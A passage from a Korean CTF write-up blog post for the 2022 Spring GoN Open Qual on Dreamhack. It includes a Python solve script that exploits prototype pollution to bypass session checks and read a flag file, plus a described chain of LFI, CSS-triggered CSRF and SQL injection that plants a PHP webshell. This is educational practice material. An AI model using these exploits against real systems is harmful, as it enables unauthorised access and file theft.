        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find file</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">read_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">content</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">file_content</span><span class="p">:</span> <span class="nx">content</span><span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>그래서 내가 생각한 시나리오는 아래와 같았다.</p><ol><li>userid로 <code class="language-plaintext highlighter-rouge">__proto__</code>를 줘서 <code class="language-plaintext highlighter-rouge">users[__proto__]</code>를 부르게 한다.<li>ws_name도 <code class="language-plaintext highlighter-rouge">__proto__</code>를 줘서 <code class="language-plaintext highlighter-rouge">users[__proto__].workspaces[__proto__]</code>를 부르게 한다.<li>f_name으로 아무거나 줘서 <code class="language-plaintext highlighter-rouge">user[__proto__].workspaces[__proto__][f_name]</code>이 <code class="language-plaintext highlighter-rouge">flag</code>를 반환하게 한다.<li>PP로 <code class="language-plaintext highlighter-rouge">user[__proto__].base_dir</code>이 <code class="language-plaintext highlighter-rouge">/usr/src/app</code>을 반환하게 한다.</ol><p>따라서 현재까지의 시나리오를 위해 만들어야 할 값은 아래와 같다.</p><ul><li><code class="language-plaintext highlighter-rouge">{}.__proto__.workspace = "asdf"</code> -&gt; <code class="language-plaintext highlighter-rouge">users[__proto__].workspaces</code>가 <code class="language-plaintext highlighter-rouge">undefined</code>가 되지 않도록<li><code class="language-plaintext highlighter-rouge">{}.__proto__.asdf = "flag"</code> -&gt; <code class="language-plaintext highlighter-rouge">user[__proto__].workspaces[__proto__][f_name]</code>이 <code class="language-plaintext highlighter-rouge">flag</code>를 반환하도록<li><code class="language-plaintext highlighter-rouge">{}.__proto__.base_dir = "/usr/src/app"</code> -&gt; <code class="language-plaintext highlighter-rouge">user[__proto__].base_dir</code>이 <code class="language-plaintext highlighter-rouge">/usr/src/app</code>을 반환하도록</ul><p>그런데 코드를 조금 더 살펴보면 문제가 있다.<br /> 9번째 줄의 분기를 통과하는 token을 만들어야 한다.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">check_session</code> 함수는 다음과 같다.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">sess</span> <span class="o">=</span> <span class="nx">tokens</span><span class="p">[</span><span class="nx">token</span><span class="p">]</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">sess</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">sess</span><span class="p">.</span><span class="nx">owner</span> <span class="o">!=</span> <span class="nx">userid</span><span class="p">)</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">sess</span><span class="p">.</span><span class="nx">expire</span> <span class="o">&lt;</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">){</span>
        <span class="nx">tokens</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>해당 함수 또한 PP를 이용해서 통과하기 위해 token을 <code class="language-plaintext highlighter-rouge">__proto__</code>로 줬을 때의 필요한 조건을 생각하였다.</p><ol><li><code class="language-plaintext highlighter-rouge">tokens[__proto__].owner</code>가 <code class="language-plaintext highlighter-rouge">__proto__</code>를 반환<li><code class="language-plaintext highlighter-rouge">tokens[__proto__].owner</code>가 매우 큰 정수를 반환</ol><p>위 두 조건을 만족하면 통과할 수 있는데<br /> 1번 조건은 <code class="language-plaintext highlighter-rouge">{}.__proto__.owner = "__proto__"</code>를 줘서 쉽게 넘어갈 수 있다.</p><p>2번 조건은 <code class="language-plaintext highlighter-rouge">{digit 문자열} &lt; {정수}</code> 식이 <code class="language-plaintext highlighter-rouge">{정수} &lt; {정수}</code>로 인식되는 점을 이용해서<br /> <code class="language-plaintext highlighter-rouge">{}.__proto__.expire = "999999999999999"</code>를 줘서 넘어갈 수 있다.</p><p>위의 PP를 모두 만들고 파일을 부르면 플래그를 얻을 수 있다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://host2.dreamhack.games:12391/api"</span>
<span class="c1"># URL = "http://localhost:8888/api"
</span>
<span class="n">proto_user</span> <span class="o">=</span> <span class="s">"__proto__"</span>
<span class="n">user</span> <span class="o">=</span> <span class="s">"qqq"</span>
<span class="n">pw</span> <span class="o">=</span> <span class="s">"asdfasdfasdf"</span>
<span class="n">ws</span> <span class="o">=</span> <span class="s">"__proto__"</span>

<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/users"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"pass"</span><span class="p">:</span><span class="n">pw</span><span class="p">}).</span><span class="n">json</span><span class="p">())</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/users/auth"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"pass"</span><span class="p">:</span><span class="n">pw</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">c</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>

<span class="c1">### users[qqq].workspaces["__proto__"].expire = "99999999999999999999999999"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"expire"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"99999999999999999999999999"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span> 
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].owner = "__proto__"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"owner"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"__proto__"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].workspaces = "asdfasdfasdf"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"workspaces"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"asdfasdfasdf"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].zzzzzz = "flag"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"zzzzzz"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"flag"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### users[qqq].workspaces["__proto__"].base_dir = "/usr/src/app"
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"/users/</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">/__proto__"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span><span class="s">"file_name"</span><span class="p">:</span><span class="s">"base_dir"</span><span class="p">,</span><span class="s">"file_content"</span><span class="p">:</span><span class="s">"zzlol"</span><span class="p">,</span><span class="s">"file_path"</span><span class="p">:</span><span class="s">"/usr/src/app"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="c1">### get(users.__proto__.base_dir + users.__proto__.workspaces.__proto__.zzzzzz)
### == get("/usr/src/app/flag")
</span><span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/users/__proto__/__proto__/zzzzzz"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"userid"</span><span class="p">:</span><span class="s">'__proto__'</span><span class="p">,</span><span class="s">"token"</span><span class="p">:</span><span class="s">'__proto__'</span><span class="p">,</span><span class="s">"ws_name"</span><span class="p">:</span><span class="s">"123"</span><span class="p">}).</span><span class="n">json</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">c</span><span class="p">[</span><span class="s">'file_content'</span><span class="p">]).</span><span class="n">decode</span><span class="p">())</span>
</pre></table></code></div></div><h2 id="r-billionaire---blockchain">R. billionaire - Blockchain<a href="#r-billionaire---blockchain" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Contract를 배포하는 트랜젝션의 디테일 페이지에 들어가면, 플래그 데이터가 담긴 storage를 확인할 수 있다.</p><p>휙득한 데이터를 solidity 코드에 맞게 xor해주면 플래그를 휙득할 수 있다.</p><h2 id="t-legendary---crypto">T. Legendary - Crypto<a href="#t-legendary---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Legendre PRF 문제이다.</p><p>어느 깃허브 <a href="https://github.com/cryptolu/LegendrePRF">레포지토리</a>에 이더리움 바운티가 걸린 Legendre PRF를 풀기 위한 솔브 코드가 작성되어 있었다.</p><p>해당 레포의 <code class="language-plaintext highlighter-rouge">solve.cpp</code>를 주어진 문제에 맞게 적당히 수정하여 컴파일 한 후 실행하면 플래그를 휙득할 수 있었다.</p><h2 id="u-legendary---revenge---crypto">U. Legendary - Revenge - Crypto<a href="#u-legendary---revenge---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="#t-legendary---crypto">T</a>에서 <code class="language-plaintext highlighter-rouge">prime</code>의 비트 수가 많아지고, output이 줄어들었다.</p><p>때문에, 동일한 방법으로 풀이를 하려고 시도했다.</p><p>하지만 많은 메모리가 필요해서 vm환경에서는 실행할 수 없는데<br /> 어떠한 원인에서인지 Host OS 환경에서는 제대로 실행이 되지 않아서<br /> 서버 호스팅을 하는 친구의 남는 자원을 빌려서 32코어, 32GB의 램을 가진 인스턴스를 받았다.</p><p>16스레드로를 주고 10분간 돌린 결과 플래그를 휙득할 수 있었다.</p><p>풀고난 직후에는 너무 많은 컴퓨팅 파워가 필요한게 아닌가 싶었지만<br /> 조금 생각해보니까 아무래도 내 풀이가 의도되지 않은 자원 박치기인 것 같았다.<br /> 의도되진 않았더라도 코드를 보고 분석해서 수정했다면 조금 더 적은 자원으로도 풀 수 있지 않았을까하는 생각이 든다.</p><h2 id="v-colorfulmemo---web">V. ColorfulMemo - Web<a href="#v-colorfulmemo---web" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>해당 문제는 3개의 웹 취약점을 연계해서 웹쉘을 만드는 컨셉의 문제였다.<br /> 사용된 취약점은 <code class="language-plaintext highlighter-rouge">LFI</code>, <code class="language-plaintext highlighter-rouge">CSRF</code>, <code class="language-plaintext highlighter-rouge">SQLi</code>이다.</p><p>우선 <code class="language-plaintext highlighter-rouge">index.php</code>를 보면</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"path"</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$path</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"main"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"./"</span><span class="mf">.</span><span class="nv">$path</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
...(중략)...
<span class="cp">&lt;?php</span> <span class="k">include_once</span> <span class="nv">$path</span><span class="p">;</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>위와 같은 GET 파라미터로 날아온 <code class="language-plaintext highlighter-rouge">path</code>값에 아무런 검증 없이 <code class="language-plaintext highlighter-rouge">./</code>와 <code class="language-plaintext highlighter-rouge">.php</code>를 붙여서 include를 해준다. 따라서 위 부분에서 LFI가 발생한다.</p><p>글을 write할 때, <code class="language-plaintext highlighter-rouge">style</code> 태그에 큰 제약 없이 아무거나 쓸 수 있다.<br /> 이때 <code class="language-plaintext highlighter-rouge">black;background-image:URL(URL)</code>방식으로 csrf를 트리거할 수 있게 된다.</p><p>또, <code class="language-plaintext highlighter-rouge">check.php</code>를 살펴보면</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'127.0.0.1'</span> <span class="o">||</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'::1'</span><span class="p">){</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
    <span class="nv">$mysqli</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span><span class="s1">'user'</span><span class="p">,</span><span class="s1">'password'</span><span class="p">,</span><span class="s1">'colorfulmemo'</span><span class="p">);</span>
    <span class="c1">// I believe admin</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'SELECT adminCheck FROM memo WHERE id = '</span><span class="mf">.</span><span class="nv">$id</span><span class="p">);</span>

<span class="mf">...</span><span class="p">(</span><span class="n">후략</span><span class="p">)</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>만약 클라이언트의 주소가 로컬 호스트인 경우에<br /> GET 파라미터로 날리는 <code class="language-plaintext highlighter-rouge">id</code>를 이용해서 SQL injection이 가능하다.</p><p>그런데 <code class="language-plaintext highlighter-rouge">my.cnf</code>파일에 <code class="language-plaintext highlighter-rouge">secure-file-priv= /tmp/</code>가 있으므로<br /> <code class="language-plaintext highlighter-rouge">/tmp</code> 디렉토리에 파일을 읽고 쓸수 있다.</p><p>그래서 생각한 시나리오는 다음과 같다.</p><ol><li>write할 때 color에 <code class="language-plaintext highlighter-rouge">black;background-image:URL("/?path=check.php&amp;id={적절한 /tmp/asdf.php 웹쉘 업로드 구문}")</code>을 준다.\<li>그리고 해당 글을 리포트하면 CSRF -&gt; SQLi가 발생해서 <code class="language-plaintext highlighter-rouge">/tmp/asdf.php</code>에 웹쉘이 만들어진다.\<li><code class="language-plaintext highlighter-rouge">/?path=../../../tmp/asdf.php</code>에 접속한다.</ol><p>위 시나리오대로 플래그를 휙득할 수 있었다.</p><h2 id="후기">후기<a href="#후기" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>작년 FIESTA 이후로 대회 시간이 긴 CTF는 꽤 간만에 하는 것 같았다.<br /> 긴 CTF를 하면 시간을 많이 박아도 부담이 없어서 좋지만<br /> 순위 유지에 그만큼 시간이 더 들어서 힘이 드는 것 같다.</p><p>모쪼롬 많이 얻어가고 재미있게 했던 CTF였다.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/gon/" class="post-tag no-text-decoration" >GoN</a> <a href="/tags/dreamhack/" class="post-tag no-text-decoration" >Dreamhack</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=2022 Spring GoN Open Qual Writeup - G0RiyA&url=https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=2022 Spring GoN Open Qual Writeup - G0RiyA&u=https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=2022 Spring GoN Open Qual Writeup - G0RiyA&url=https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/2022-Spring-GoN-Open-Qual-Writeup/">2022 Spring GoN Open Qual Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dreamhack/">Dreamhack</a> <a class="post-tag" href="/tags/gon/">GoN</a> <a class="post-tag" href="/tags/writeup/">writeup</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><script src="https://utteranc.es/client.js" repo="G0RiyA/G0RiyA.github.io" issue-term="pathname" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/G0RiyA">G0RiyA</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/dreamhack/">Dreamhack</a> <a class="post-tag" href="/tags/gon/">GoN</a> <a class="post-tag" href="/tags/writeup/">writeup</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } 